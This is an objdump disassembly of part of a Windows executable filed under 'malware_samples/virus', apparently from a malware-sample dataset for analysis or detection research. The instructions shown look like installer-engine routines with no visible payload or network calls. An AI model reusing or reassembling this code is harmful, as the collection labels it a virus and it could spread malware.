
malware_samples/virus/53a1eebbb64c49252cd29f5bf5b3d652c73ad7bf3116bbd1e17d1e1fa36c863a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d 88 3e 42 00    	mov    0x423e88,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 48 72 40 00    	call   *0x407248
  401032:	e9 42 01 00 00       	jmp    0x401179
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 90 3e 42 00    	mov    0x423e90,%esi
  40103f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401042:	57                   	push   %edi
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 4c 72 40 00    	call   *0x40724c
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 50 72 40 00    	call   *0x407250
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 44 70 40 00    	mov    0x407044,%ebx
  40106e:	e9 80 00 00 00       	jmp    0x4010f3
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108c:	99                   	cltd
  40108d:	f7 ff                	idiv   %edi
  40108f:	33 d2                	xor    %edx,%edx
  401091:	8a f0                	mov    %al,%dh
  401093:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  401097:	0f af c1             	imul   %ecx,%eax
  40109a:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  40109e:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a2:	03 c1                	add    %ecx,%eax
  4010a4:	8b ca                	mov    %edx,%ecx
  4010a6:	99                   	cltd
  4010a7:	f7 ff                	idiv   %edi
  4010a9:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010ad:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b1:	8a c8                	mov    %al,%cl
  4010b3:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010b7:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010bb:	03 c2                	add    %edx,%eax
  4010bd:	99                   	cltd
  4010be:	f7 ff                	idiv   %edi
  4010c0:	c1 e1 08             	shl    $0x8,%ecx
  4010c3:	0f b6 c0             	movzbl %al,%eax
  4010c6:	0b c8                	or     %eax,%ecx
  4010c8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010cb:	50                   	push   %eax
  4010cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010cf:	ff 15 48 70 40 00    	call   *0x407048
  4010d5:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010d9:	89 45 14             	mov    %eax,0x14(%ebp)
  4010dc:	50                   	push   %eax
  4010dd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e0:	50                   	push   %eax
  4010e1:	ff 75 0c             	push   0xc(%ebp)
  4010e4:	ff 15 54 72 40 00    	call   *0x407254
  4010ea:	ff 75 14             	push   0x14(%ebp)
  4010ed:	ff d3                	call   *%ebx
  4010ef:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010f3:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010f6:	0f 8c 77 ff ff ff    	jl     0x401073
  4010fc:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401100:	74 65                	je     0x401167
  401102:	ff 76 34             	push   0x34(%esi)
  401105:	ff 15 4c 70 40 00    	call   *0x40704c
  40110b:	85 c0                	test   %eax,%eax
  40110d:	89 45 14             	mov    %eax,0x14(%ebp)
  401110:	74 55                	je     0x401167
  401112:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401115:	6a 01                	push   $0x1
  401117:	57                   	push   %edi
  401118:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  40111f:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  401126:	ff 15 50 70 40 00    	call   *0x407050
  40112c:	ff 76 58             	push   0x58(%esi)
  40112f:	57                   	push   %edi
  401130:	ff 15 54 70 40 00    	call   *0x407054
  401136:	ff 75 14             	push   0x14(%ebp)
  401139:	8b 35 58 70 40 00    	mov    0x407058,%esi
  40113f:	57                   	push   %edi
  401140:	ff d6                	call   *%esi
  401142:	89 45 0c             	mov    %eax,0xc(%ebp)
  401145:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401148:	68 20 08 00 00       	push   $0x820
  40114d:	50                   	push   %eax
  40114e:	6a ff                	push   $0xffffffff
  401150:	68 80 36 42 00       	push   $0x423680
  401155:	57                   	push   %edi
  401156:	ff 15 58 72 40 00    	call   *0x407258
  40115c:	ff 75 0c             	push   0xc(%ebp)
  40115f:	57                   	push   %edi
  401160:	ff d6                	call   *%esi
  401162:	ff 75 14             	push   0x14(%ebp)
  401165:	ff d3                	call   *%ebx
  401167:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40116a:	50                   	push   %eax
  40116b:	ff 75 08             	push   0x8(%ebp)
  40116e:	ff 15 5c 72 40 00    	call   *0x40725c
  401174:	5f                   	pop    %edi
  401175:	5e                   	pop    %esi
  401176:	33 c0                	xor    %eax,%eax
  401178:	5b                   	pop    %ebx
  401179:	c9                   	leave
  40117a:	c2 10 00             	ret    $0x10
  40117d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401181:	a1 a8 3e 42 00       	mov    0x423ea8,%eax
  401186:	8b d1                	mov    %ecx,%edx
  401188:	53                   	push   %ebx
  401189:	69 d2 18 04 00 00    	imul   $0x418,%edx,%edx
  40118f:	56                   	push   %esi
  401190:	57                   	push   %edi
  401191:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401195:	f6 c2 02             	test   $0x2,%dl
  401198:	74 4f                	je     0x4011e9
  40119a:	8d 71 01             	lea    0x1(%ecx),%esi
  40119d:	33 ff                	xor    %edi,%edi
  40119f:	3b 35 ac 3e 42 00    	cmp    0x423eac,%esi
  4011a5:	73 42                	jae    0x4011e9
  4011a7:	8b ce                	mov    %esi,%ecx
  4011a9:	69 c9 18 04 00 00    	imul   $0x418,%ecx,%ecx
  4011af:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011b3:	8b 08                	mov    (%eax),%ecx
  4011b5:	f6 c1 02             	test   $0x2,%cl
  4011b8:	74 03                	je     0x4011bd
  4011ba:	47                   	inc    %edi
  4011bb:	eb 1e                	jmp    0x4011db
  4011bd:	f6 c1 04             	test   $0x4,%cl
  4011c0:	74 09                	je     0x4011cb
  4011c2:	8b cf                	mov    %edi,%ecx
  4011c4:	4f                   	dec    %edi
  4011c5:	85 c9                	test   %ecx,%ecx
  4011c7:	74 20                	je     0x4011e9
  4011c9:	eb 10                	jmp    0x4011db
  4011cb:	f6 c1 10             	test   $0x10,%cl
  4011ce:	75 0b                	jne    0x4011db
  4011d0:	8b d9                	mov    %ecx,%ebx
  4011d2:	33 da                	xor    %edx,%ebx
  4011d4:	83 e3 01             	and    $0x1,%ebx
  4011d7:	33 d9                	xor    %ecx,%ebx
  4011d9:	89 18                	mov    %ebx,(%eax)
  4011db:	46                   	inc    %esi
  4011dc:	05 18 04 00 00       	add    $0x418,%eax
  4011e1:	3b 35 ac 3e 42 00    	cmp    0x423eac,%esi
  4011e7:	72 ca                	jb     0x4011b3
  4011e9:	5f                   	pop    %edi
  4011ea:	5e                   	pop    %esi
  4011eb:	5b                   	pop    %ebx
  4011ec:	c2 04 00             	ret    $0x4
  4011ef:	55                   	push   %ebp
  4011f0:	8b ec                	mov    %esp,%ebp
  4011f2:	51                   	push   %ecx
  4011f3:	51                   	push   %ecx
  4011f4:	8b 55 08             	mov    0x8(%ebp),%edx
  4011f7:	53                   	push   %ebx
  4011f8:	56                   	push   %esi
  4011f9:	8b f2                	mov    %edx,%esi
  4011fb:	69 f6 18 04 00 00    	imul   $0x418,%esi,%esi
  401201:	8b 1d a8 3e 42 00    	mov    0x423ea8,%ebx
  401207:	33 c9                	xor    %ecx,%ecx
  401209:	03 f3                	add    %ebx,%esi
  40120b:	57                   	push   %edi
  40120c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40120f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	a8 02                	test   $0x2,%al
  401217:	74 0b                	je     0x401224
  401219:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40121c:	74 06                	je     0x401224
  40121e:	24 be                	and    $0xbe,%al
  401220:	42                   	inc    %edx
  401221:	89 46 08             	mov    %eax,0x8(%esi)
  401224:	3b 15 ac 3e 42 00    	cmp    0x423eac,%edx
  40122a:	73 44                	jae    0x401270
  40122c:	8b c2                	mov    %edx,%eax
  40122e:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  401234:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401238:	8d 42 01             	lea    0x1(%edx),%eax
  40123b:	8b 0f                	mov    (%edi),%ecx
  40123d:	f6 c1 02             	test   $0x2,%cl
  401240:	74 0a                	je     0x40124c
  401242:	6a 01                	push   $0x1
  401244:	52                   	push   %edx
  401245:	e8 a5 ff ff ff       	call   0x4011ef
  40124a:	8b 0f                	mov    (%edi),%ecx
  40124c:	f6 c1 04             	test   $0x4,%cl
  40124f:	75 28                	jne    0x401279
  401251:	f6 c1 40             	test   $0x40,%cl
  401254:	74 03                	je     0x401259
  401256:	ff 45 fc             	incl   -0x4(%ebp)
  401259:	f6 c1 01             	test   $0x1,%cl
  40125c:	74 05                	je     0x401263
  40125e:	ff 45 fc             	incl   -0x4(%ebp)
  401261:	eb 03                	jmp    0x401266
  401263:	ff 45 f8             	incl   -0x8(%ebp)
  401266:	3b 05 ac 3e 42 00    	cmp    0x423eac,%eax
  40126c:	8b d0                	mov    %eax,%edx
  40126e:	72 bc                	jb     0x40122c
  401270:	33 c0                	xor    %eax,%eax
  401272:	5f                   	pop    %edi
  401273:	5e                   	pop    %esi
  401274:	5b                   	pop    %ebx
  401275:	c9                   	leave
  401276:	c2 08 00             	ret    $0x8
  401279:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40127d:	74 f3                	je     0x401272
  40127f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401283:	74 06                	je     0x40128b
  401285:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401289:	eb e7                	jmp    0x401272
  40128b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40128e:	80 e1 7f             	and    $0x7f,%cl
  401291:	83 c9 01             	or     $0x1,%ecx
  401294:	89 4e 08             	mov    %ecx,0x8(%esi)
  401297:	eb d9                	jmp    0x401272
  401299:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40129d:	a1 a8 3e 42 00       	mov    0x423ea8,%eax
  4012a2:	56                   	push   %esi
  4012a3:	33 f6                	xor    %esi,%esi
  4012a5:	83 f9 20             	cmp    $0x20,%ecx
  4012a8:	73 34                	jae    0x4012de
  4012aa:	39 35 ac 3e 42 00    	cmp    %esi,0x423eac
  4012b0:	76 2c                	jbe    0x4012de
  4012b2:	8d 50 08             	lea    0x8(%eax),%edx
  4012b5:	57                   	push   %edi
  4012b6:	8b 02                	mov    (%edx),%eax
  4012b8:	a8 06                	test   $0x6,%al
  4012ba:	75 12                	jne    0x4012ce
  4012bc:	33 ff                	xor    %edi,%edi
  4012be:	47                   	inc    %edi
  4012bf:	d3 e7                	shl    %cl,%edi
  4012c1:	85 7a fc             	test   %edi,-0x4(%edx)
  4012c4:	74 04                	je     0x4012ca
  4012c6:	0c 01                	or     $0x1,%al
  4012c8:	eb 02                	jmp    0x4012cc
  4012ca:	24 fe                	and    $0xfe,%al
  4012cc:	89 02                	mov    %eax,(%edx)
  4012ce:	46                   	inc    %esi
  4012cf:	81 c2 18 04 00 00    	add    $0x418,%edx
  4012d5:	3b 35 ac 3e 42 00    	cmp    0x423eac,%esi
  4012db:	72 d9                	jb     0x4012b6
  4012dd:	5f                   	pop    %edi
  4012de:	5e                   	pop    %esi
  4012df:	c2 04 00             	ret    $0x4
  4012e2:	55                   	push   %ebp
  4012e3:	8b ec                	mov    %esp,%ebp
  4012e5:	83 ec 0c             	sub    $0xc,%esp
  4012e8:	a1 90 3e 42 00       	mov    0x423e90,%eax
  4012ed:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4012f1:	53                   	push   %ebx
  4012f2:	56                   	push   %esi
  4012f3:	05 94 00 00 00       	add    $0x94,%eax
  4012f8:	57                   	push   %edi
  4012f9:	8b 3d ac 3e 42 00    	mov    0x423eac,%edi
  4012ff:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401302:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401305:	33 db                	xor    %ebx,%ebx
  401307:	39 18                	cmp    %ebx,(%eax)
  401309:	74 4b                	je     0x401356
  40130b:	3b df                	cmp    %edi,%ebx
  40130d:	73 45                	jae    0x401354
  40130f:	8b 35 a8 3e 42 00    	mov    0x423ea8,%esi
  401315:	83 c6 08             	add    $0x8,%esi
  401318:	8b 16                	mov    (%esi),%edx
  40131a:	f6 c2 06             	test   $0x6,%dl
  40131d:	75 28                	jne    0x401347
  40131f:	8b 45 08             	mov    0x8(%ebp),%eax
  401322:	85 c0                	test   %eax,%eax
  401324:	74 06                	je     0x40132c
  401326:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  40132a:	74 1b                	je     0x401347
  40132c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40132f:	33 c0                	xor    %eax,%eax
  401331:	40                   	inc    %eax
  401332:	83 e2 01             	and    $0x1,%edx
  401335:	d3 e0                	shl    %cl,%eax
  401337:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40133a:	23 c8                	and    %eax,%ecx
  40133c:	8b c1                	mov    %ecx,%eax
  40133e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401341:	d3 e2                	shl    %cl,%edx
  401343:	3b c2                	cmp    %edx,%eax
  401345:	75 0b                	jne    0x401352
  401347:	43                   	inc    %ebx
  401348:	81 c6 18 04 00 00    	add    $0x418,%esi
  40134e:	3b df                	cmp    %edi,%ebx
  401350:	72 c6                	jb     0x401318
  401352:	3b df                	cmp    %edi,%ebx
  401354:	74 0d                	je     0x401363
  401356:	ff 45 fc             	incl   -0x4(%ebp)
  401359:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40135d:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401361:	72 9f                	jb     0x401302
  401363:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401366:	5f                   	pop    %edi
  401367:	5e                   	pop    %esi
  401368:	5b                   	pop    %ebx
  401369:	c9                   	leave
  40136a:	c2 04 00             	ret    $0x4
  40136d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401371:	85 c0                	test   %eax,%eax
  401373:	7d 11                	jge    0x401386
  401375:	40                   	inc    %eax
  401376:	b9 00 40 42 00       	mov    $0x424000,%ecx
  40137b:	c1 e0 0a             	shl    $0xa,%eax
  40137e:	2b c8                	sub    %eax,%ecx
  401380:	51                   	push   %ecx
  401381:	e8 ce 45 00 00       	call   0x405954
  401386:	c2 04 00             	ret    $0x4
  401389:	56                   	push   %esi
  40138a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40138e:	eb 6a                	jmp    0x4013fa
  401390:	8b c6                	mov    %esi,%eax
  401392:	8b 0d b0 3e 42 00    	mov    0x423eb0,%ecx
  401398:	6b c0 1c             	imul   $0x1c,%eax,%eax
  40139b:	03 c1                	add    %ecx,%eax
  40139d:	83 38 01             	cmpl   $0x1,(%eax)
  4013a0:	74 5c                	je     0x4013fe
  4013a2:	50                   	push   %eax
  4013a3:	e8 8c 00 00 00       	call   0x401434
  4013a8:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013ad:	74 55                	je     0x401404
  4013af:	50                   	push   %eax
  4013b0:	e8 b8 ff ff ff       	call   0x40136d
  4013b5:	85 c0                	test   %eax,%eax
  4013b7:	75 04                	jne    0x4013bd
  4013b9:	40                   	inc    %eax
  4013ba:	46                   	inc    %esi
  4013bb:	eb 07                	jmp    0x4013c4
  4013bd:	48                   	dec    %eax
  4013be:	8b ce                	mov    %esi,%ecx
  4013c0:	8b f0                	mov    %eax,%esi
  4013c2:	2b c1                	sub    %ecx,%eax
  4013c4:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013c9:	74 2f                	je     0x4013fa
  4013cb:	01 05 6c 36 42 00    	add    %eax,0x42366c
  4013d1:	6a 00                	push   $0x0
  4013d3:	ff 35 54 36 42 00    	push   0x423654
  4013d9:	68 30 75 00 00       	push   $0x7530
  4013de:	ff 35 6c 36 42 00    	push   0x42366c
  4013e4:	ff 15 30 71 40 00    	call   *0x407130
  4013ea:	50                   	push   %eax
  4013eb:	68 02 04 00 00       	push   $0x402
  4013f0:	ff 74 24 18          	push   0x18(%esp)
  4013f4:	ff 15 44 72 40 00    	call   *0x407244
  4013fa:	85 f6                	test   %esi,%esi
  4013fc:	7d 92                	jge    0x401390
  4013fe:	33 c0                	xor    %eax,%eax
  401400:	5e                   	pop    %esi
  401401:	c2 08 00             	ret    $0x8
  401404:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401409:	eb f5                	jmp    0x401400
  40140b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40140f:	8b 0d 90 3e 42 00    	mov    0x423e90,%ecx
  401415:	6a 00                	push   $0x0
  401417:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  40141b:	e8 69 ff ff ff       	call   0x401389
  401420:	c2 04 00             	ret    $0x4
  401423:	68 50 9f 40 00       	push   $0x409f50
  401428:	ff 74 24 08          	push   0x8(%esp)
  40142c:	e8 4a 39 00 00       	call   0x404d7b
  401431:	c2 04 00             	ret    $0x4
  401434:	55                   	push   %ebp
  401435:	8b ec                	mov    %esp,%ebp
  401437:	81 ec a4 01 00 00    	sub    $0x1a4,%esp
  40143d:	a1 88 3e 42 00       	mov    0x423e88,%eax
  401442:	53                   	push   %ebx
  401443:	56                   	push   %esi
  401444:	8b 75 08             	mov    0x8(%ebp),%esi
  401447:	57                   	push   %edi
  401448:	6a 07                	push   $0x7
  40144a:	59                   	pop    %ecx
  40144b:	8d 7d d8             	lea    -0x28(%ebp),%edi
  40144e:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401451:	33 db                	xor    %ebx,%ebx
  401453:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401455:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401458:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40145b:	8b f0                	mov    %eax,%esi
  40145d:	8b fa                	mov    %edx,%edi
  40145f:	c1 e6 0a             	shl    $0xa,%esi
  401462:	b9 00 40 42 00       	mov    $0x424000,%ecx
  401467:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40146a:	c1 e7 0a             	shl    $0xa,%edi
  40146d:	03 f1                	add    %ecx,%esi
  40146f:	03 f9                	add    %ecx,%edi
  401471:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  401474:	89 0d 48 9b 40 00    	mov    %ecx,0x409b48
  40147a:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40147d:	83 c1 fe             	add    $0xfffffffe,%ecx
  401480:	83 f9 41             	cmp    $0x41,%ecx
  401483:	0f 87 02 14 00 00    	ja     0x40288b
  401489:	ff 24 8d 9d 28 40 00 	jmp    *0x40289d(,%ecx,4)
  401490:	53                   	push   %ebx
  401491:	50                   	push   %eax
  401492:	e8 e4 38 00 00       	call   0x404d7b
  401497:	e9 72 0d 00 00       	jmp    0x40220e
  40149c:	ff 05 4c 36 42 00    	incl   0x42364c
  4014a2:	39 5d cc             	cmp    %ebx,-0x34(%ebp)
  4014a5:	0f 84 63 0d 00 00    	je     0x40220e
  4014ab:	53                   	push   %ebx
  4014ac:	ff 15 f8 71 40 00    	call   *0x4071f8
  4014b2:	e9 57 0d 00 00       	jmp    0x40220e
  4014b7:	50                   	push   %eax
  4014b8:	e8 b0 fe ff ff       	call   0x40136d
  4014bd:	48                   	dec    %eax
  4014be:	53                   	push   %ebx
  4014bf:	50                   	push   %eax
  4014c0:	e8 c4 fe ff ff       	call   0x401389
  4014c5:	e9 cc 13 00 00       	jmp    0x402896
  4014ca:	53                   	push   %ebx
  4014cb:	50                   	push   %eax
  4014cc:	e8 aa 38 00 00       	call   0x404d7b
  4014d1:	e9 b5 13 00 00       	jmp    0x40288b
  4014d6:	53                   	push   %ebx
  4014d7:	e8 fd 14 00 00       	call   0x4029d9
  4014dc:	83 f8 01             	cmp    $0x1,%eax
  4014df:	7f 03                	jg     0x4014e4
  4014e1:	33 c0                	xor    %eax,%eax
  4014e3:	40                   	inc    %eax
  4014e4:	50                   	push   %eax
  4014e5:	ff 15 88 70 40 00    	call   *0x407088
  4014eb:	e9 9b 13 00 00       	jmp    0x40288b
  4014f0:	ff 75 cc             	push   -0x34(%ebp)
  4014f3:	ff 15 fc 71 40 00    	call   *0x4071fc
  4014f9:	e9 8d 13 00 00       	jmp    0x40288b
  4014fe:	c1 e0 02             	shl    $0x2,%eax
  401501:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401504:	75 22                	jne    0x401528
  401506:	8b 88 00 3f 42 00    	mov    0x423f00(%eax),%ecx
  40150c:	6a 01                	push   $0x1
  40150e:	89 88 40 3f 42 00    	mov    %ecx,0x423f40(%eax)
  401514:	e8 c0 14 00 00       	call   0x4029d9
  401519:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40151c:	89 04 8d 00 3f 42 00 	mov    %eax,0x423f00(,%ecx,4)
  401523:	e9 63 13 00 00       	jmp    0x40288b
  401528:	8b 88 40 3f 42 00    	mov    0x423f40(%eax),%ecx
  40152e:	89 88 00 3f 42 00    	mov    %ecx,0x423f00(%eax)
  401534:	e9 52 13 00 00       	jmp    0x40288b
  401539:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40153c:	8d 34 85 00 3f 42 00 	lea    0x423f00(,%eax,4),%esi
  401543:	33 c0                	xor    %eax,%eax
  401545:	8b 0e                	mov    (%esi),%ecx
  401547:	3b cb                	cmp    %ebx,%ecx
  401549:	0f 94 c0             	sete   %al
  40154c:	23 4d e8             	and    -0x18(%ebp),%ecx
  40154f:	8b 44 85 dc          	mov    -0x24(%ebp,%eax,4),%eax
  401553:	89 0e                	mov    %ecx,(%esi)
  401555:	e9 3c 13 00 00       	jmp    0x402896
  40155a:	ff 34 95 00 3f 42 00 	push   0x423f00(,%edx,4)
  401561:	56                   	push   %esi
  401562:	e9 cc 12 00 00       	jmp    0x402833
  401567:	8b 0d 50 36 42 00    	mov    0x423650,%ecx
  40156d:	8b 35 60 72 40 00    	mov    0x407260,%esi
  401573:	3b cb                	cmp    %ebx,%ecx
  401575:	74 07                	je     0x40157e
  401577:	52                   	push   %edx
  401578:	51                   	push   %ecx
  401579:	ff d6                	call   *%esi
  40157b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40157e:	8b 0d 64 36 42 00    	mov    0x423664,%ecx
  401584:	3b cb                	cmp    %ebx,%ecx
  401586:	0f 84 ff 12 00 00    	je     0x40288b
  40158c:	50                   	push   %eax
  40158d:	51                   	push   %ecx
  40158e:	ff d6                	call   *%esi
  401590:	e9 f6 12 00 00       	jmp    0x40288b
  401595:	6a f0                	push   $0xfffffff0
  401597:	e8 5a 14 00 00       	call   0x4029f6
  40159c:	ff 75 e0             	push   -0x20(%ebp)
  40159f:	50                   	push   %eax
  4015a0:	ff 15 84 70 40 00    	call   *0x407084
  4015a6:	85 c0                	test   %eax,%eax
  4015a8:	0f 85 dd 12 00 00    	jne    0x40288b
  4015ae:	e9 a9 10 00 00       	jmp    0x40265c
  4015b3:	6a f0                	push   $0xfffffff0
  4015b5:	e8 3c 14 00 00       	call   0x4029f6
  4015ba:	8b f8                	mov    %eax,%edi
  4015bc:	57                   	push   %edi
  4015bd:	e8 a2 3f 00 00       	call   0x405564
  4015c2:	8b f0                	mov    %eax,%esi
  4015c4:	3b f3                	cmp    %ebx,%esi
  4015c6:	74 42                	je     0x40160a
  4015c8:	6a 5c                	push   $0x5c
  4015ca:	56                   	push   %esi
  4015cb:	e8 2b 3f 00 00       	call   0x4054fb
  4015d0:	8b f0                	mov    %eax,%esi
  4015d2:	53                   	push   %ebx
  4015d3:	57                   	push   %edi
  4015d4:	8a 06                	mov    (%esi),%al
  4015d6:	88 1e                	mov    %bl,(%esi)
  4015d8:	88 45 0b             	mov    %al,0xb(%ebp)
  4015db:	ff 15 80 70 40 00    	call   *0x407080
  4015e1:	85 c0                	test   %eax,%eax
  4015e3:	75 1b                	jne    0x401600
  4015e5:	ff 15 7c 70 40 00    	call   *0x40707c
  4015eb:	3d b7 00 00 00       	cmp    $0xb7,%eax
  4015f0:	75 0b                	jne    0x4015fd
  4015f2:	57                   	push   %edi
  4015f3:	ff 15 78 70 40 00    	call   *0x407078
  4015f9:	a8 10                	test   $0x10,%al
  4015fb:	75 03                	jne    0x401600
  4015fd:	ff 45 fc             	incl   -0x4(%ebp)
  401600:	8a 45 0b             	mov    0xb(%ebp),%al
  401603:	88 06                	mov    %al,(%esi)
  401605:	46                   	inc    %esi
  401606:	3a c3                	cmp    %bl,%al
  401608:	75 be                	jne    0x4015c8
  40160a:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  40160d:	74 1e                	je     0x40162d
  40160f:	6a e6                	push   $0xffffffe6
  401611:	e8 0d fe ff ff       	call   0x401423
  401616:	57                   	push   %edi
  401617:	68 00 98 42 00       	push   $0x429800
  40161c:	e8 bc 43 00 00       	call   0x4059dd
  401621:	57                   	push   %edi
  401622:	ff 15 74 70 40 00    	call   *0x407074
  401628:	e9 5e 12 00 00       	jmp    0x40288b
  40162d:	6a f5                	push   $0xfffffff5
  40162f:	e9 30 0b 00 00       	jmp    0x402164
  401634:	53                   	push   %ebx
  401635:	e8 bc 13 00 00       	call   0x4029f6
  40163a:	50                   	push   %eax
  40163b:	e8 98 46 00 00       	call   0x405cd8
  401640:	e9 35 06 00 00       	jmp    0x401c7a
  401645:	6a d0                	push   $0xffffffd0
  401647:	e8 aa 13 00 00       	call   0x4029f6
  40164c:	6a df                	push   $0xffffffdf
  40164e:	8b f0                	mov    %eax,%esi
  401650:	e8 a1 13 00 00       	call   0x4029f6
  401655:	6a 13                	push   $0x13
  401657:	8b f8                	mov    %eax,%edi
  401659:	e8 98 13 00 00       	call   0x4029f6
  40165e:	57                   	push   %edi
  40165f:	56                   	push   %esi
  401660:	ff 15 70 70 40 00    	call   *0x407070
  401666:	85 c0                	test   %eax,%eax
  401668:	74 07                	je     0x401671
  40166a:	6a e3                	push   $0xffffffe3
  40166c:	e9 f3 0a 00 00       	jmp    0x402164
  401671:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401674:	0f 84 e2 0f 00 00    	je     0x40265c
  40167a:	56                   	push   %esi
  40167b:	e8 58 46 00 00       	call   0x405cd8
  401680:	85 c0                	test   %eax,%eax
  401682:	0f 84 d4 0f 00 00    	je     0x40265c
  401688:	57                   	push   %edi
  401689:	56                   	push   %esi
  40168a:	e8 9c 40 00 00       	call   0x40572b
  40168f:	6a e4                	push   $0xffffffe4
  401691:	e9 ce 0a 00 00       	jmp    0x402164
  401696:	53                   	push   %ebx
  401697:	e8 5a 13 00 00       	call   0x4029f6
  40169c:	8b f0                	mov    %eax,%esi
  40169e:	8d 45 08             	lea    0x8(%ebp),%eax
  4016a1:	50                   	push   %eax
  4016a2:	57                   	push   %edi
  4016a3:	68 00 04 00 00       	push   $0x400
  4016a8:	56                   	push   %esi
  4016a9:	ff 15 6c 70 40 00    	call   *0x40706c
  4016af:	85 c0                	test   %eax,%eax
  4016b1:	74 23                	je     0x4016d6
  4016b3:	8b 45 08             	mov    0x8(%ebp),%eax
  4016b6:	3b c6                	cmp    %esi,%eax
  4016b8:	76 25                	jbe    0x4016df
  4016ba:	38 18                	cmp    %bl,(%eax)
  4016bc:	74 21                	je     0x4016df
  4016be:	56                   	push   %esi
  4016bf:	e8 14 46 00 00       	call   0x405cd8
  4016c4:	3b c3                	cmp    %ebx,%eax
  4016c6:	74 0e                	je     0x4016d6
  4016c8:	83 c0 2c             	add    $0x2c,%eax
  4016cb:	50                   	push   %eax
  4016cc:	ff 75 08             	push   0x8(%ebp)
  4016cf:	e8 09 43 00 00       	call   0x4059dd
